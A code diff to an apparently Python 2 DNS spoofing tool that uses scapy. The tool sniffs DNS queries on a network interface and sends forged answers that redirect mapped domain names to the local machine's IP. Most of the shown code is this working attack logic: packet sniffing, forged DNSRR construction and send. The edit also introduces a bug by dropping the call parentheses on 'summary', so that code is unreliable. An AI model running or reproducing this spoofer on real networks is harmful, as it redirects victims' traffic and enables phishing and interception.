@@ -2,9 +2,8 @@ from scapy.all import *
 import sys, getopt
 import netifaces
 
-
 def callback(map, local_ip):
-    def get_response(pkt):
+    def callback_func(pkt):
         if not DNS in pkt:
             return
         # if IP in pkt:
@@ -30,7 +29,7 @@ def callback(map, local_ip):
                                      / DNS(id=txn_id, ancount=1, qr=1, an=DNSRR(rrname=q_name, rdata=local_ip))
                     send(spoofed_packet, verbose=0)
                     # return 'Spoofed DNS Response Sent - URL: {0}'.format(pkt[DNSQR].qname, str(pkt[DNS].id), local_ip)
-                    return 'Spoofed DNS Response Sent - {0}'.format(spoofed_packet.summary())
+                    return 'Spoofed DNS Response Sent - {0}'.format(spoofed_packet.summary)
                 else:
                     return
         else:
@@ -45,7 +44,7 @@ def callback(map, local_ip):
             else:
                 return
 
-    return get_response
+    return callback_func
 
 
 def get_local_ip(interface_name):
@@ -104,15 +103,15 @@ def main(argv):
                         url += "."
                     map.add((ip, url))
 
-            print "Dict is " + str(map)
+            print "Watching for requests: " + str(map)
         except OSError:
             print('Error in opening host_mapping file:' + hosts_file)
             sys.exit(2)
 
     bpf_filt = 'udp port 53' if (bpf_expr is '') else bpf_expr
     interface = get_default_interface() if interface_name is '' else interface_name
-    print interface
     local_ip = get_local_ip(interface)
+    print 'Listening on interface: {0}, local IP: {1}'.format(interface, local_ip)
     print local_ip
     sniff(iface=interface, filter=bpf_filt, prn=callback(map, local_ip))
 
